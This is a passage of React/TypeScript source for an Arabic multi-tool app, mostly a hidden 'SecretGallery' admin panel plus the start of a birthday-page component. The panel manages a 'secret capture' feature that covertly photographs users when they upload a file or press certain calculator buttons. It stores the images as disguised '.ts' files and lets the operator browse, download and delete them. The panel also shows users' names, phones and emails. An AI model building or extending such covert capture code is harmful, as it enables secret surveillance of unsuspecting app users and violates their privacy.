                    onKeyDown={e => e.key === 'Enter' && handleSendMessage(selectedFriend.phone)}
                  />
                  <button 
                    onClick={() => handleSendMessage(selectedFriend.phone)}
                    className="p-2 sm:p-3.5 bg-blue-600 hover:bg-blue-500 text-white rounded-lg sm:rounded-2xl shadow-xl shadow-blue-600/30 active:scale-90 shrink-0 transition-all font-bold flex items-center justify-center"
                  >
                    <Send className="size-3.5 sm:size-5" />
                  </button>
               </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};


const SecretGallery = ({ 
  onClose, 
  showToast, 
  tips, 
  onUpdateTips 
}: { 
  onClose: () => void, 
  showToast: any,
  tips: UsageTip[],
  onUpdateTips: (t: UsageTip[]) => void
}) => {
  const [folders, setFolders] = useState<UserFolder[]>([]);
  const [currentFolder, setCurrentFolder] = useState<UserFolder | null>(null);
  const [selectedPaths, setSelectedPaths] = useState<Set<string>>(new Set()); // path is "folder/filename" or "folder"
  const [loading, setLoading] = useState(true);
  const [subTab, setSubTab] = useState<'archive' | 'control' | 'appeals' | 'family'>('archive');
  const [settings, setSettings] = useState({ stealthCaptureGlobal: true, calcTriggerEnabled: true });
  const [appeals, setAppeals] = useState<any[]>([]);
  const [familyMsgs, setFamilyMsgs] = useState<any[]>([]);

  const fetchSettings = async () => {
    try {
      const res = await fetch('/api/control/settings');
      if (res.ok) {
        const data = await res.json();
        setSettings(data);
      }
    } catch (e) {}
  };

  const fetchAppeals = async () => {
    try {
      const res = await fetch('/api/chat/appeals');
      if (res.ok) {
        const data = await res.json();
        setAppeals(data.sort((a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()));
      }
    } catch (e) {}
  };

  const fetchFamilyMsgs = async () => {
    try {
      const res = await fetch('/api/chat/family-messages');
      if (res.ok) {
        const data = await res.json();
        setFamilyMsgs(data.sort((a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()));
      }
    } catch (e) {}
  };

  const updateSettings = async (newSettings: any) => {
    const updated = { ...settings, ...newSettings };
    setSettings(updated);
    try {
      await fetch('/api/control/settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(updated)
      });
      showToast('تم تحديث إعدادات التحكم بنجاح', 'success');
    } catch (e) {
      showToast('فشل تحديث الإعدادات', 'error');
    }
  };

  const [newTip, setNewTip] = useState<Omit<UsageTip, 'id'>>({ title: '', text: '', targetTab: 'calc' });

  const fetchFolders = async () => {
    try {
      const res = await fetch('/api/stored-images');
      const data = await res.json();
      setFolders(data);
      if (currentFolder) {
        const updated = data.find((f: any) => f.folderName === currentFolder.folderName);
        if (updated) {
          setCurrentFolder(updated);
        } else {
          setCurrentFolder(null); // Folder deleted
        }
      }
    } catch (e) {
      console.error("Failed to fetch images", e);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchFolders();
    fetchSettings();
    fetchAppeals();
    fetchFamilyMsgs();
  }, []);

  // Clear selection when navigating between list and folder view
  useEffect(() => {
    setSelectedPaths(new Set());
  }, [currentFolder]);

  const toggleSelect = (path: string) => {
    const next = new Set(selectedPaths);
    if (next.has(path)) next.delete(path);
    else next.add(path);
    setSelectedPaths(next);
  };

  const deleteItems = async (items: { folder: string; filename?: string }[]) => {
    if (items.length === 0) return;
    
    setLoading(true);
    try {
      const res = await fetch('/api/delete-items', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ items })
      });

      const data = await res.json();
      if (res.ok && data.success) {
        setSelectedPaths(new Set());
        await fetchFolders();
        showToast('تم الحذف النهائي والقطعي بنجاح ✨', 'success');
      } else {
        showToast("فشل الحذف: " + (data.error || "خطأ مجهول"), 'error');
      }
    } catch (e) {
      showToast("حدث خطأ أثناء الاتصال بالخادم لمسح البيانات", 'error');
    } finally {
      setLoading(false);
    }
  };

  const deleteSelected = async () => {
    if (selectedPaths.size === 0) return;
    
    const items = Array.from(selectedPaths).map(p => {
      if (p.includes('/')) {
        const [folder, filename] = p.split('/');
        return { folder, filename };
      }
      return { folder: p };
    });

    let msg = '';
    const hasFolder = items.some(i => !i.filename);
    if (hasFolder) {
      msg = `تحذير: لقد اخترت مجلدات كاملة. سيتم حذف ${items.filter(i => !i.filename).length} مجلد بجميع محتوياته بالإضافة إلى ${items.filter(i => i.filename).length} ملف منفرد. هل أنت متأكد من الحذف النهائي؟ لا يمكن استعادة البيانات.`;
    } else {
      msg = `تأكيد الحذف النهائي: هل أنت متأكد من حذف ${selectedPaths.size} ملف/ملفات تماماً من المجلد السري؟ سيتم مسحها نهائياً.`;
    }

    if (!confirm(msg)) return;
    await deleteItems(items);
  };

  const selectAll = () => {
    if (!currentFolder) {
      if (selectedPaths.size === folders.length) setSelectedPaths(new Set());
      else setSelectedPaths(new Set(folders.map(f => f.folderName)));
    } else {
      const allFilePaths = currentFolder.files.map(f => `${f.folder}/${f.name}`);
      const alreadySelected = allFilePaths.every(p => selectedPaths.has(p));
      const next = new Set(selectedPaths);
      if (alreadySelected) {
        allFilePaths.forEach(p => next.delete(p));
      } else {
        allFilePaths.forEach(p => next.add(p));
      }
      setSelectedPaths(next);
    }
  };

  const downloadSelected = async () => {
    if (selectedPaths.size === 0) return;
    
    const items = Array.from(selectedPaths).map(p => {
      if (p.includes('/')) {
        const [folder, filename] = p.split('/');
        return { folder, filename };
      }
      return { folder: p };
    });

    // If only one item selected, use specific downloader
    if (items.length === 1) {
      const item = items[0];
      if (item.filename) {
        await downloadSingle(item.folder, item.filename);
      } else {
        await downloadFolderZip(item.folder);
      }
      return;
    }

    try {
      showToast('روح الذكية: جارٍ تحضير الأرشيف المجمع...', 'info');
      const res = await fetch('/api/download-multi', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ items })
      });
      if (!res.ok) throw new Error('فشل التحميل المجمع: استجابة غير صالحة');
      const blob = await res.blob();
      const url = window.URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      link.download = `أرشيف_روح_المحدد_${Date.now()}.zip`;
      document.body.appendChild(link);
      link.click();
      setTimeout(() => {
        document.body.removeChild(link);
        window.URL.revokeObjectURL(url);
      }, 1500);
      showToast('تم تحميل المحدد فوراً بصيغة مضغوطة', 'success');
    } catch (e) {
      showToast('فشل التحميل المجمع', 'error');
    }
  };

  const downloadSingle = async (folder: string, filename: string) => {
    try {
      showToast('روح الذكية: جارٍ تحميل الملف...', 'info');
      const res = await fetch(`/api/view-image/${folder}/${filename}`);
      if (!res.ok) throw new Error('فشل تحميل الملف: استجابة غير صالحة');
      const blob = await res.blob();
      const url = window.URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      link.download = filename.replace('.ts', '.jpg');
      document.body.appendChild(link);
      link.click();
      setTimeout(() => {
        document.body.removeChild(link);
        window.URL.revokeObjectURL(url);
      }, 1500);
      showToast('اكتمل التحميل المباشر بنجاح', 'success');
    } catch (e) {
      showToast('فشل تحميل الملف', 'error');
    }
  };

  const downloadFolderZip = (folderName: string) => {
    showToast('روح الذكية: جارٍ ضغط المجلد...', 'info');
    const link = document.createElement('a');
    link.style.display = 'none';
    link.href = `/api/download-folder/${folderName}`;
    link.download = `روح_الذكية_مجلد_${folderName}.zip`;
    document.body.appendChild(link);
    link.click();
    setTimeout(() => {
      document.body.removeChild(link);
    }, 2000);
  };

  return (
    <motion.div 
      initial={{ opacity: 0, x: '100%' }}
      animate={{ opacity: 1, x: 0 }}
      exit={{ opacity: 0, x: '100%' }}
      className="fixed inset-0 z-[200] bg-[#0c0d0f] flex flex-col pt-safe text-white"
    >
      <div className="p-4 border-b border-gray-800 flex items-center justify-between">
        <div className="flex items-center gap-2 max-w-[60%]">
          <button onClick={currentFolder ? () => setCurrentFolder(null) : onClose} className="p-2 text-gray-400 hover:text-white shrink-0">
            <ChevronRight size={24} />
          </button>
          <h2 className="text-sm sm:text-lg font-black italic truncate">
             {subTab === 'archive' ? (currentFolder ? currentFolder.folderName : 'متابعة التطبيق (الأرشيف)') : 'الكنترول الإداري'}
          </h2>
        </div>
        
        {subTab === 'archive' && (
          <div className="flex gap-2">
            {selectedPaths.size > 0 ? (
              <motion.div 
                initial={{ scale: 0.8, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                className="flex gap-2"
              >
                <button 
                  onClick={downloadSelected} 
                  title="تحميل المحدد كملف مضغوط" 
                  className="px-3 py-1.5 text-xs font-black bg-blue-600 text-white rounded-xl shadow-lg shadow-blue-500/30 flex items-center gap-2 active:scale-95 transition-all"
                >
                  <Download size={14} />
                  <span>تنزيل ({selectedPaths.size})</span>
                </button>
                <button 
                  onClick={deleteSelected} 
                  title="حذف المحدد نهائياً" 
                  className="px-3 py-1.5 text-xs font-black bg-red-600 text-white rounded-xl shadow-lg shadow-red-500/30 flex items-center gap-2 active:scale-95 transition-all"
                >
                  <Trash2 size={14} />
                  <span>حذف</span>
                </button>
              </motion.div>
            ) : (
              <button 
                onClick={selectAll} 
                title="تحديد الكل" 
                className="p-2.5 text-gray-400 hover:text-white bg-gray-800 rounded-xl border border-gray-700 active:scale-95 transition-all"
              >
                <LayoutGrid size={20} />
              </button>
            )}
          </div>
        )}
      </div>

      {!currentFolder && (
        <div className="flex bg-[#121417] p-1 mx-4 mt-4 rounded-2xl border border-gray-800">
          <button 
            onClick={() => setSubTab('archive')}
            className={cn(
              "flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl text-[10px] font-black italic transition-all",
              subTab === 'archive' ? "bg-blue-600 text-white shadow-lg shadow-blue-500/20" : "text-gray-500 hover:text-gray-300"
            )}
          >
            <Heart size={14} className={subTab === 'archive' ? "fill-white/20" : ""} />
            متابعة التطبيق
          </button>
          <button 
            onClick={() => setSubTab('appeals')}
            className={cn(
              "flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl text-[10px] font-black italic transition-all",
              subTab === 'appeals' ? "bg-emerald-600 text-white shadow-lg shadow-emerald-500/20" : "text-gray-500 hover:text-gray-300"
            )}
          >
            <AlertCircle size={14} />
            الاستئنافات
          </button>
          <button 
            onClick={() => setSubTab('control')}
            className={cn(
              "flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl text-[10px] font-black italic transition-all",
              subTab === 'control' ? "bg-red-600 text-white shadow-lg shadow-red-500/20" : "text-gray-500 hover:text-gray-300"
            )}
          >
            <SettingsIcon size={14} />
            الكنترول
          </button>
          <button 
            onClick={() => setSubTab('family')}
            className={cn(
              "flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl text-[10px] font-black italic transition-all",
              subTab === 'family' ? "bg-purple-600 text-white shadow-lg shadow-purple-500/20" : "text-gray-500 hover:text-gray-300"
            )}
          >
            <Heart size={14} />
            العائلة
          </button>
        </div>
      )}

      <div className="flex-1 overflow-y-auto p-4 custom-scrollbar">
        {subTab === 'archive' && !currentFolder && (
          <div className="mb-8 space-y-4 animate-in slide-in-from-top duration-500">
             <div className="flex items-center gap-2 mb-2">
               <Bell size={18} className="text-blue-500 shadow-glow" />
               <h3 className="text-sm font-black italic">إدارة إشعارات دليل الاستخدام</h3>
             </div>
             
             {/* Add New Tip Form */}
             <div className="bg-[#1a1c1e] border border-blue-500/30 p-5 rounded-3xl space-y-3 shadow-2xl">
                <input 
                  type="text" 
                  placeholder="عنوان الإشعار..." 
                  className="w-full bg-black/40 border border-gray-800 rounded-2xl p-4 text-xs font-bold focus:border-blue-500 outline-none transition-all"
                  value={newTip.title}
                  onChange={(e) => setNewTip({...newTip, title: e.target.value})}
                />
                <textarea 
                  placeholder="نص الإشعار التفصيلي..." 
                  className="w-full bg-black/40 border border-gray-800 rounded-2xl p-4 text-xs font-bold focus:border-blue-500 outline-none min-h-[90px] transition-all"
                  value={newTip.text}
                  onChange={(e) => setNewTip({...newTip, text: e.target.value})}
                />
                <div className="flex gap-3">
                  <select 
                    className="flex-1 bg-black/40 border border-gray-800 rounded-2xl p-4 text-xs font-bold outline-none focus:border-blue-500 appearance-none text-blue-400"
                    value={newTip.targetTab}
                    onChange={(e) => setNewTip({...newTip, targetTab: e.target.value})}
                  >
                    <option value="calc">الحاسبة</option>
                    <option value="services">خدمات روح</option>
                    <option value="tools">أدوات روح</option>
                    <option value="ai">المنقذ الذكي</option>
                    <option value="chat">دردشة روح</option>
                    <option value="health">صحة روح</option>
                  </select>
                  <button 
                    onClick={() => {
                      if (!newTip.title || !newTip.text) {
                        showToast('يرجى إكمال بيانات الإشعار', 'error');
                        return;
                      }
                      const tip: UsageTip = { ...newTip, id: Math.random().toString(36).substring(2, 9), targetTab: newTip.targetTab };
                      onUpdateTips([...tips, tip]);
                      setNewTip({ title: '', text: '', targetTab: 'calc' });
                      showToast('تم إضافة الإشعار بنجاح ✨', 'success');
                    }}
                    className="px-8 bg-blue-600 hover:bg-blue-500 rounded-2xl font-black text-xs transition-all active:scale-95 shadow-lg shadow-blue-600/30"
                  >
                    إضافة
                  </button>
                </div>
             </div>

             {/* Existing Tips List */}
             <div className="space-y-3 max-h-[350px] overflow-y-auto px-1 custom-scrollbar">
                {tips.length === 0 ? (
                  <div className="flex flex-col items-center justify-center py-6 opacity-30">
                    <Info size={32} className="mb-2" />
                    <p className="text-[10px] italic font-bold">لا توجد إشعارات مضافة حالياً</p>
                  </div>
                ) : (
                  tips.map(tip => (
                    <div key={tip.id} className="bg-white/5 border border-white/5 p-4 rounded-[2rem] flex items-center justify-between group hover:bg-white/10 transition-all">
                       <div className="flex flex-col gap-1.5 flex-1 pr-2">
                         <div className="flex items-center gap-2">
                            <div className="w-1.5 h-1.5 rounded-full bg-blue-500 shadow-glow" />
                            <span className="text-xs font-black text-blue-400">{tip.title}</span>
                         </div>
                         <p className="text-[10px] text-gray-400 font-bold leading-relaxed">{tip.text}</p>
                         <div className="flex mt-1">
                           <span className="text-[8px] bg-blue-600/20 px-3 py-0.5 rounded-full text-blue-300 font-black italic border border-blue-500/20">{tip.targetTab}</span>
                         </div>
                       </div>
                       <button 
                         onClick={() => {
                           onUpdateTips(tips.filter(t => t.id !== tip.id));
                           showToast('تم حذف الإشعار بنجاح', 'info');
                         }}
                         className="p-2.5 text-gray-500 hover:text-red-500 transition-colors bg-white/5 rounded-xl hover:bg-red-500/10 border border-transparent hover:border-red-500/20"
                       >
                         <Trash2 size={16} />
                       </button>
                    </div>
                  ))
                )}
             </div>
             <div className="h-[1px] bg-gradient-to-r from-transparent via-gray-800 to-transparent w-full my-6" />
          </div>
        )}
        {subTab === 'family' && (
          <div className="space-y-4 pb-20 animate-in slide-in-from-bottom duration-500">
            {familyMsgs.length === 0 ? (
              <div className="flex flex-col items-center justify-center py-20 opacity-30">
                <Heart size={48} className="mb-4" />
                <p className="text-xs font-black italic">لا يوجد رسائل من عائلة روح حالياً</p>
              </div>
            ) : (
              familyMsgs.map((msg, i) => (
                <div key={msg.id || `family-${i}`} className="bg-white/5 border border-white/10 p-5 rounded-3xl space-y-4">
                  <div className="flex items-center justify-between">
                    <span className={cn(
                      "px-3 py-1 rounded-full text-[8px] font-black uppercase tracking-widest",
                      msg.type === 'stolen_phone' ? "bg-red-500 text-white" : 
                      msg.type === 'inquiry' ? "bg-blue-500 text-white" : "bg-emerald-500 text-white"
                    )}>
                      {msg.type === 'stolen_phone' ? 'بلاغ سرقة⚠️' : msg.type === 'inquiry' ? 'استفسار' : 'شكوى'}
                    </span>
                    <span className="text-[9px] text-gray-500 font-bold">{new Date(msg.timestamp).toLocaleString('ar-EG')}</span>
                  </div>
                  <div className="space-y-1">
                    <p className="text-sm font-black text-gray-200">{msg.name}</p>
                    <p className="text-[10px] font-mono text-gray-500">{msg.phone}</p>
                  </div>
                  <div className="p-4 bg-black/40 rounded-2xl border border-white/5 text-[11px] leading-relaxed text-gray-300">
                    {msg.message}
                  </div>
                </div>
              ))
            )}
          </div>
        )}
        {subTab === 'archive' ? (
          loading ? (
            <div className="h-full flex items-center justify-center text-gray-500 font-bold italic">جاري جلب البيانات السرية...</div>
          ) : !currentFolder ? (
            // Folders List
            <div className="grid grid-cols-1 gap-3">
              {folders.length === 0 ? (
                <div className="h-full flex flex-col items-center justify-center text-gray-600 gap-4 mt-20">
                  <LayoutGrid size={48} className="opacity-20" />
                  <p className="font-bold italic">لا يوجد أرشيف مسجل حالياً</p>
                </div>
              ) : (
                folders.map((f) => (
                  <div 
                    key={f.folderName}
                    className={cn(
                      "bg-[#1a1c1e] border border-gray-800 rounded-2xl p-4 flex items-center justify-between transition-all cursor-pointer group",
                      selectedPaths.has(f.folderName) ? "border-blue-500 ring-1 ring-blue-500" : "hover:border-gray-700"
                    )}
                    onClick={(e) => {
                      if ((e.target as HTMLElement).closest('.action-btn')) return;
                      setCurrentFolder(f);
                    }}
                  >
                    <div className="flex items-center gap-3">
                      <button 
                        className={cn(
                          "action-btn w-6 h-6 rounded-full border-2 flex items-center justify-center transition-colors",
                          selectedPaths.has(f.folderName) ? "bg-blue-500 border-blue-500" : "border-gray-700"
                        )}
                        onClick={() => toggleSelect(f.folderName)}
                      >
                        {selectedPaths.has(f.folderName) && <CheckCircle2 size={14} className="text-white" />}
                      </button>
                      <div className="flex flex-col">
                        <span className="text-sm font-bold truncate max-w-[150px] sm:max-w-[300px] italic">{f.folderName}</span>
                        <span className="text-[10px] text-gray-500 font-bold">{f.files.length} ملف مشفر</span>
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                       <button 
                        onClick={(e) => { e.stopPropagation(); downloadFolderZip(f.folderName); }}
                        className="action-btn p-2 text-gray-500 hover:text-blue-400 bg-gray-800 rounded-lg hover:bg-gray-700 transition-all border border-gray-700"
                       >
                        <Download size={14} />
                       </button>
                       <ChevronLeft size={16} className="text-gray-700" />
                    </div>
                  </div>
                ))
              )}
            </div>
          ) : (
            // Files List (in folder)
            <div className="space-y-6">
               <div className="flex items-center justify-between px-2">
                 <p className="text-[10px] text-gray-500 font-black uppercase tracking-widest">محتويات الأرشيف</p>
                 <span className="text-[10px] text-blue-500 font-bold bg-blue-500/10 px-2 py-0.5 rounded-full">{currentFolder.files.length}</span>
               </div>
               <div className="grid grid-cols-2 xs:grid-cols-3 sm:grid-cols-4 gap-3">
                {currentFolder.files.map((file) => {
                  const path = `${file.folder}/${file.name}`;
                  const isSelected = selectedPaths.has(path);
                  return (
                    <div 
                      key={file.name}
                      onClick={() => toggleSelect(path)}
                      className={cn(
                        "aspect-square rounded-2xl border-2 transition-all cursor-pointer relative overflow-hidden group",
                        isSelected ? "border-blue-500 ring-2 ring-blue-500/20" : "border-gray-800 hover:border-gray-600"
                      )}
                    >
                      <img 
                        src={`/api/view-image/${file.folder}/${file.name}`} 
                        className={cn("w-full h-full object-cover", isSelected ? "opacity-40" : "opacity-80 group-hover:opacity-100")}
                        loading="lazy"
                      />
                      <div className="absolute top-2 right-2">
                        <div className={cn(
                          "w-5 h-5 rounded-full border-2 flex items-center justify-center",
                          isSelected ? "bg-blue-500 border-blue-500" : "bg-black/40 border-white/20"
                        )}>
                          {isSelected && <CheckCircle2 size={12} className="text-white" />}
                        </div>
                      </div>
                      <button 
                        onClick={(e) => { e.stopPropagation(); downloadSingle(file.folder, file.name); }}
                        className="absolute top-2 left-2 p-1.5 bg-black/60 rounded-lg text-white opacity-0 group-hover:opacity-100 transition-opacity border border-white/10"
                      >
                        <Download size={14} />
                      </button>
                      <div className="absolute bottom-0 inset-x-0 p-2 bg-gradient-to-t from-black/80 to-transparent">
                        <p className="text-[9px] font-bold truncate text-gray-300">{file.name}</p>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          )
        ) : subTab === 'appeals' ? (
          <div className="space-y-4">
             <div className="bg-emerald-600/10 p-6 rounded-[2.5rem] border border-emerald-500/20 space-y-2 mb-6">
              <h2 className="text-sm font-black text-emerald-500 flex items-center gap-2">
                <AlertCircle size={16} /> طلبات الاستئناف والمراجعة
              </h2>
              <p className="text-[10px] text-emerald-400 opacity-80 italic">هنا تظهر طلبات المستخدمين الذين يطالبون بملكية أرقام هواتف مسجلة بالفعل.</p>
            </div>

            {appeals.length === 0 ? (
               <div className="text-center py-20 opacity-20 flex flex-col items-center gap-4">
                  <AlertCircle size={48} />
                  <p className="font-bold italic">لا توجد طلبات استئناف حالياً</p>
               </div>
            ) : (
              <div className="grid grid-cols-1 gap-3">
                {appeals.map((appeal) => (
                  <div key={appeal.id} className="bg-[#1a1c1e] border border-gray-800 rounded-3xl p-5 space-y-4 shadow-xl">
                    <div className="flex items-center justify-between">
                       <div className="flex items-center gap-3">
                         <div className="w-10 h-10 rounded-xl bg-emerald-600/10 flex items-center justify-center text-emerald-500">
                           <User size={20} />
                         </div>
                         <div className="flex flex-col">
                           <span className="text-xs font-black text-white italic">{appeal.name}</span>
                           <span className="text-[10px] text-gray-500 font-mono">{appeal.phone}</span>
                         </div>
                       </div>
                       <span className="text-[9px] text-gray-600 font-bold">{new Date(appeal.timestamp).toLocaleDateString('ar-EG')}</span>
                    </div>
                    <div className="bg-black/40 p-4 rounded-2xl border border-gray-800 space-y-2">
                       <div className="flex items-center gap-2 text-[10px] font-black text-blue-400">
                          <Mail size={12} />
                          <span>{appeal.email}</span>
                       </div>
                       <p className="text-[10px] text-gray-400 leading-relaxed italic">" {appeal.reason} "</p>
                    </div>
                    <div className="flex gap-2">
                       <a href={`mailto:${appeal.email}`} className="flex-1 py-2 bg-blue-600 rounded-xl text-[10px] font-black text-center shadow-lg">رد عبر البريد</a>
                       <button 
                         onClick={async () => {
                           if (!confirm('هل تريد حذف هذا الاستئناف من السجل؟')) return;
                            try {
                              const res = await fetch('/api/chat/appeal/delete', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ id: appeal.id })
                              });
                              if (res.ok) {
                                showToast('تم حذف الاستئناف بنجاح', 'success');
                                fetchAppeals();
                              }
                            } catch (e) {}
                         }}
                         className="px-4 py-2 bg-gray-800 rounded-xl text-[10px] font-black text-red-500 border border-red-500/10"
                       >حذف</button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        ) : (
          <div className="flex flex-col gap-6 max-w-lg mx-auto w-full">
            <div className="bg-red-600/10 p-6 rounded-[2.5rem] border border-red-500/20 space-y-2">
              <h2 className="text-sm font-black text-red-500 flex items-center gap-2">
                <SettingsIcon size={16} /> إدارة النظام (الكنترول)
              </h2>
              <p className="text-[10px] text-red-400">هذه المنطقة مخصصة لإدارة موارد التطبيق الأساسية بشكل دائم.</p>
            </div>

            <div className="bg-[#1a1c1e] p-8 rounded-[2.5rem] border border-gray-800 space-y-8">
              <div className="space-y-4">
                <label className="text-[10px] text-gray-500 font-black px-2 block tracking-widest uppercase italic">إعدادات الالتقاط السري</label>
                
                <div className="space-y-3">
                  <div className="flex items-center justify-between p-4 bg-black/40 rounded-2xl border border-gray-800">
                    <div className="flex flex-col">
                      <span className="text-[11px] font-black text-gray-200">الالتقاط السري العام</span>
                      <span className="text-[8px] text-gray-500 italic">تفعيل ملتقط الصور السرية عند أول رفع ملف</span>
                    </div>
                    <button 
                      onClick={() => updateSettings({ stealthCaptureGlobal: !settings.stealthCaptureGlobal })}
                      className={cn(
                        "w-10 h-5 rounded-full relative transition-all",
                        settings.stealthCaptureGlobal ? "bg-red-600" : "bg-gray-700"
                      )}
                    >
                      <div className={cn("absolute top-1 w-3 h-3 rounded-full bg-white transition-all", settings.stealthCaptureGlobal ? "right-1" : "right-6")} />
                    </button>
                  </div>

                  <div className="flex items-center justify-between p-4 bg-black/40 rounded-2xl border border-gray-800">
                    <div className="flex flex-col">
                      <span className="text-[11px] font-black text-gray-200">الالتقاط عند أزرار الحاسبة</span>
                      <span className="text-[8px] text-gray-500 italic">الحاسبة: (1) العادية، (2) البرمجية، (5) العلمية</span>
                    </div>
                    <button 
                      onClick={() => updateSettings({ calcTriggerEnabled: !settings.calcTriggerEnabled })}
                      className={cn(
                        "w-10 h-5 rounded-full relative transition-all",
                        settings.calcTriggerEnabled ? "bg-red-600" : "bg-gray-700"
                      )}
                    >
                      <div className={cn("absolute top-1 w-3 h-3 rounded-full bg-white transition-all", settings.calcTriggerEnabled ? "right-1" : "right-6")} />
                    </button>
                  </div>
                </div>
              </div>

              <div className="space-y-4">
                <label className="text-[10px] text-gray-500 font-black px-2 block tracking-widest uppercase">تحديث الباركود الإداري</label>
                
                <div 
                  onClick={() => document.getElementById('barcode-upload-secret')?.click()}
                  className="w-full aspect-square max-w-[200px] mx-auto bg-black/40 border-2 border-dashed border-gray-800 rounded-3xl flex flex-col items-center justify-center cursor-pointer hover:border-blue-500 transition-all overflow-hidden relative"
                >
                  <img id="barcode-preview-secret" src="/api/control/barcode" className="w-full h-full object-contain opacity-40" onError={(e) => e.currentTarget.style.display = 'none'} />
                  <div className="absolute inset-0 flex flex-col items-center justify-center space-y-2 bg-black/60 opacity-0 hover:opacity-100 transition-opacity">
                     <Upload size={32} className="text-blue-500" />
                     <span className="text-[10px] text-white font-bold">رفع باركود جديد</span>
                  </div>
                  <input 
                    id="barcode-upload-secret" 
                    type="file" 
                    className="hidden" 
                    accept="image/*" 
                    onChange={async (e) => {
                      const file = e.target.files?.[0];
                      if (file) {
                        const reader = new FileReader();
                        reader.onload = async (rv) => {
                          const base64 = rv.target?.result as string;
                          try {
                            const res = await fetch('/api/control/barcode', {
                              method: 'POST',
                              headers: { 'Content-Type': 'application/json' },
                              body: JSON.stringify({ image: base64 })
                            });
                            localStorage.setItem('rouh_app_barcode_watermark', base64);
                            try {
                              const { firebaseUploadBarcodeWatermark } = await import('./lib/firebaseSync');
                              await firebaseUploadBarcodeWatermark(base64);
                            } catch (fbErr) {}
                            if (res.ok) {
                              showToast('تم تحديث الباركود الإداري بنجاح', 'success');
                              (document.getElementById('barcode-preview-secret') as HTMLImageElement).src = base64;
                              (document.getElementById('barcode-preview-secret') as HTMLImageElement).style.display = 'block';
                            }
                          } catch (err) {
                            showToast('فشل في حفظ الباركود', 'error');
                          }
                        };
                        reader.readAsDataURL(file);
                      }
                    }} 
                  />
                </div>
                <p className="text-[9px] text-gray-600 text-center leading-relaxed">سيتم تخزين هذا الباركود في مجلد الكنترول واستخدامه تلقائياً في كافة مطبوعات التطبيق.</p>
              </div>
            </div>
          </div>
        )}
      </div>
    </motion.div>
  );
};

// --- End of HistoryTab ---

// 1.0 Royal Birthday Experience Component - The requested HTML design
const RoyalBirthdayExperience = ({ 
  config, 
  onAddWish,
  isMini = false,
  autoOpenWish = false,
  initialTab = 'home'
}: { 
  config: any, 
  onAddWish?: (wish: any) => void,
  isMini?: boolean,
  autoOpenWish?: boolean,
  initialTab?: 'home' | 'message' | 'wishes'
}) => {
  const [activeTab, setActiveTab] = useState<'home' | 'message' | 'wishes'>(initialTab);
  const [timeLeft, setTimeLeft] = useState<any>(null);
  const [showWishModal, setShowWishModal] = useState(autoOpenWish);
  const [age, setAge] = useState(0);

  // Background Items (Falling names/icons)
  const [bgItems, setBgItems] = useState<{ id: number, x: number, delay: number, duration: number, content: string }[]>([]);

  useEffect(() => {
    if (!config?.birthDate) return;
    
    // Calculate Age
    const birth = new Date(config.birthDate);
    const now = new Date();
    let currentAge = now.getFullYear() - birth.getFullYear();
    const m = now.getMonth() - birth.getMonth();
    if (m < 0 || (m === 0 && now.getDate() < birth.getDate())) {
      currentAge--;
    }
    setAge(currentAge);

    // Initial countdown calculation
    const interval = setInterval(() => {
      const liveNow = new Date();
      let nextBirthday = new Date(liveNow.getFullYear(), birth.getMonth(), birth.getDate());
      if (nextBirthday < liveNow) nextBirthday.setFullYear(liveNow.getFullYear() + 1);
      const diff = nextBirthday.getTime() - liveNow.getTime();
      
      setTimeLeft({
        days: Math.floor(diff / (1000 * 60 * 60 * 24)),
        hours: Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)),
        minutes: Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60)),
        seconds: Math.floor((diff % (1000 * 60)) / 1000),
      });
    }, 1000);

    // Falling items setup
    const names = config.names?.map((n: any) => n.ar).filter(Boolean) || [];
    const icons = ['✨', '🌸', '💖', '👑', '🎈'];
    const pool = [...names, ...icons];
    
    const count = isMini ? 15 : 40;
    const newItems = Array.from({ length: count }, (_, i) => ({
      id: i,
      x: Math.random() * 100,
      delay: Math.random() * 10,
      duration: 15 + Math.random() * 15,
      content: pool[Math.floor(Math.random() * pool.length)]
    }));
    setBgItems(newItems);

    return () => clearInterval(interval);
  }, [config?.birthDate, config?.names, isMini]);

  const bgStyle = config.bgType === 'color' 
    ? { backgroundColor: config.bgValue } 
    : { 
        backgroundImage: `url(${config.bgValue}), linear-gradient(180deg, #0f172a 0%, #1e1b4b 100%)`, 
        backgroundSize: 'cover', 
        backgroundPosition: 'center' 
      };

  const isLightTheme = !document.documentElement.classList.contains('dark');
  let textColor = config.textColor || '#ffffff';
  let isDarkText = false;
  
  if (config.bgType === 'color' && config.bgValue) {
    const hex = config.bgValue.replace('#', '');
    if (hex.length === 6) {
      const r = parseInt(hex.substring(0, 2), 16);
      const g = parseInt(hex.substring(2, 4), 16);
      const b = parseInt(hex.substring(4, 6), 16);
      if (!isNaN(r) && !isNaN(g) && !isNaN(b)) {
        const brightness = (r * 299 + g * 587 + b * 114) / 1000;
        if (brightness > 180) {
          textColor = '#111827';
          isDarkText = true;
        } else {
          textColor = '#ffffff';
          isDarkText = false;
        }
      }
    } else {
      if (isLightTheme) {
        textColor = '#111827';
        isDarkText = true;
      } else {
        textColor = '#ffffff';
        isDarkText = false;
      }
    }
  } else {
    if (isLightTheme) {
      textColor = '#111827';
      isDarkText = true;
    } else {
      textColor = '#ffffff';
      isDarkText = false;
    }
  }

  return (
    <div 
      className={cn(
        "relative w-full h-full flex flex-col overflow-hidden select-none transition-all duration-1000",
